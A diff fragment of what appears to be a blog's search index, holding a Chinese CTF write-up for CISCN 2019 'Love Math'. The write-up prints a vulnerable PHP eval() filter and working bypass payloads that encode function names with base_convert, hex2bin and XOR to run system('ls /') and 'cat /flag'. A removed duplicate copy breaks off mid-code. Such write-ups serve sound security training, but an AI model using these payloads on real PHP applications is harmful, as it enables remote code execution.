+<p>进入环境直接就给了源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
+<h1 id="解题">解题</h1>
+<p>需要先知道几个PHP的特性：</p>
+<ul>
+<li>动态函数。<code>$func='print_r';$func('hello');</code>，这句代码是能够输出hello的，那是因为<code>$func</code>被<code>print_r</code>代替，因此能够成功执行。</li>
+<li>函数名为字符串。从上面的例子也可以看出函数名是字符串。</li>
+</ul>
+<p>先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数<code>c</code>不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到<code>eval('echo '.$content.';');</code>。</p>
+<p>因此，本题考察的应该是RCE。我们<strong>需要将<code>$content</code>通过某种方式变为类似<code>system('ls')</code>命令</strong>。</p>
+<h2 id="方法1">方法1</h2>
+<p>先放出最开始的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
+<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">因此，等价于system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>也成功被执行：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
+<p>但是，当执行有特殊符号的时候就不行了，比如<code>system('ls /')</code>，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用<code>hex2bin</code>将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
+<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /的16进制表示)</span><br><span class="line">因此，等价于system(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>但是，此时的长度已经超过80了。</p>
+<hr />
+<center>
+小知识
+</center>
+<p>接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
+<p>这样子最终传入的<code>p</code>为<code>system(id)</code>。</p>
+<hr />
+<p>因此可以利用这种办法只在<code>c</code>参数传入必要的，剩下的都通过上述方式放到<code>c</code>中。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">这样子($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">其中，&#123;&#125;用于代替[]，即$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
+<p>然后再传入<code>min=system</code>和<code>max=ls /</code>即可。最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
+<p>将<code>max=cat /flag</code>带入即可得到flag。</p>
+<p>也可以直接执行，不过要找到比较短的命令（思路也是类似的）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
+<h2 id="方法2">方法2</h2>
+<p>利用一个函数<code>getallheaders</code>，然后把命令通过HTTP头部传入。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">因此，等价于exec(getallheaders()&#123;2&#125;)，就是获取HTTP头部信息中，字段为2的内容。</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
+<h2 id="方法3">方法3</h2>
+<p>前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
+<p>会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
+<p>因此，最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">总结</h1>
+<p>这题考察的都是关于PHP的知识（我这不会PHP的太难了）</p>
+<ul>
+<li>各种编码转换绕过</li>
+<li>URL中使用<code>$_GET</code>获取数据</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF 2018 Online Tool</title>
     <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -2254,65 +2313,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CISCN 2019 初赛 Love Math</title>
-    <url>/2022/04/10/CISCN%202019%20%E5%88%9D%E8%B5%9B%20Love%20Math/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN%202019%20初赛%5DLove%20Math">Love Math</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境直接就给了源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></p>
-<h1 id="解题">解题</h1>
-<p>需要先知道几个PHP的特性：</p>
-<ul>
-<li>动态函数。<code>$func='print_r';$func('hello');</code>，这句代码是能够输出hello的，那是因为<code>$func</code>被<code>print_r</code>代替，因此能够成功执行。</li>
-<li>函数名为字符串。从上面的例子也可以看出函数名是字符串。</li>
-</ul>
-<p>先分析一下代码，首先设置了一个黑名单，然后再设置了一个白名单，也就是我们传入的参数<code>c</code>不能有黑名单的字符，又必须包含白名单的字符，而且长度不能超过80。这样子才能够最终执行到<code>eval('echo '.$content.';');</code>。</p>
-<p>因此，本题考察的应该是RCE。我们<strong>需要将<code>$content</code>通过某种方式变为类似<code>system('ls')</code>命令</strong>。</p>
-<h2 id="方法1">方法1</h2>
-<p>先放出最开始的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure></p>
-<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(784,10,36) -&gt; ls</span><br><span class="line">因此，等价于system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure></p>
-<p>也成功被执行：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410141715.png" /></p>
-<p>但是，当执行有特殊符号的时候就不行了，比如<code>system('ls /')</code>，因为特殊符号不能直接用36进制表达，如果直接输入则因为不在白名单而无法通过。因此需要利用<code>hex2bin</code>将16进制的转为字符，但是16进制也无法过白名单（纯数字可以过，或者白名单内的函数名可以过），因此还需要将16进制转为10进制才可以。因此就由了如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(1819484207)))</span><br></pre></td></tr></table></figure></p>
-<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) -&gt; system</span><br><span class="line">base_convert(37907361743,10,36) -&gt; hex2bin</span><br><span class="line">dechex(1819484207) -&gt; 6c73202f(ls /的16进制表示)</span><br><span class="line">因此，等价于system(hex2bin(6c73202f)) -&gt; system(&#x27;ls /&#x27;)</span><br></pre></td></tr></table></figure></p>
-<p>但是，此时的长度已经超过80了。</p>
-<hr />
-<center>
-小知识
-</center>
-<p>接下来就得想如何将长度缩减，忽然发现可以在url中这样传入数据： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?p=$cmd=id;system($_GET[cmd])</span><br></pre></td></tr></table></figure></p>
-<p>这样子最终传入的<code>p</code>为<code>system(id)</code>。</p>
-<hr />
-<p>因此可以利用这种办法只在<code>c</code>参数传入必要的，剩下的都通过上述方式放到<code>c</code>中。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;ls /&#x27;)</span><br><span class="line">-&gt; ?c=($$pi)&#123;min&#125;(($$pi)&#123;max&#125;)</span><br><span class="line"></span><br><span class="line">其中$pi=base_convert(37907361743,10,36)(dechex(1598506324)) -&gt; _GET</span><br><span class="line">这样子($$pi)&#123;min&#125;(($$pi)&#123;max&#125;) -&gt; $_GET&#123;min&#125;($_GET&#123;max&#125;)</span><br><span class="line">其中，&#123;&#125;用于代替[]，即$_GET[min]($_GET[max])</span><br></pre></td></tr></table></figure></p>
-<p>然后再传入<code>min=system</code>和<code>max=ls /</code>即可。最终payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;max&#125;)&amp;pi=system&amp;max=ls /</span><br><span class="line"></span><br><span class="line">如果使用min长度就会超，因此其中一个变量使用pi（这里$pi和pi是不一样的，前者是变量，后者就是一个参数名）</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144104.png" /></p>
-<p>将<code>max=cat /flag</code>带入即可得到flag。</p>
-<p>也可以直接执行，不过要找到比较短的命令（思路也是类似的）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br><span class="line">($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"></span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure></p>
-<h2 id="方法2">方法2</h2>
-<p>利用一个函数<code>getallheaders</code>，然后把命令通过HTTP头部传入。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;cmd&#125;)</span><br></pre></td></tr></table></figure></p>
-<p>解释： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi(696468,10,36) -&gt; exec</span><br><span class="line">$pi(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="line">因此，等价于exec(getallheaders()&#123;2&#125;)，就是获取HTTP头部信息中，字段为2的内容。</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410144931.png" /></p>
-<h2 id="方法3">方法3</h2>
-<p>前两种方法都是利用将要传入的命令转为数字，然后通过函数再转换回对应的函数名，从而执行命令。但是其实白名单里面有许多的可用字符，用这些字符代替之前的数字，进行某种运算得到想要的函数名。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span 